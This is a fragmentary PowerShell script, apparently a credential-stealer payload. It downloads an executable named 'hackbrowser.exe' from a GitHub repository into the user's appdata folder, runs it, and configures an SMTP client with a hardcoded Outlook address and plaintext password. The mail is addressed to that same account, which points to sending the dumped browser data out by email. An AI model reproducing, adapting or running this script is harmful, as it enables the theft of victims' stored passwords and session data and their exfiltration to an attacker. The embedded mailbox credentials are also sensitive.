...
Invoke-WebRequest -Uri "https://github.com/Hiagolevi/brow/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$smtp.Credentials = New-Object System.Net.NetworkCredential("jdbnkjhsd@outlook.com", "mudar123");
$smtp.EnableSsl = $true
$Message.From = "jdbnkjhsd@outlook.com"
$Message.To.Add("jdbnkjhsd@outlook.com")
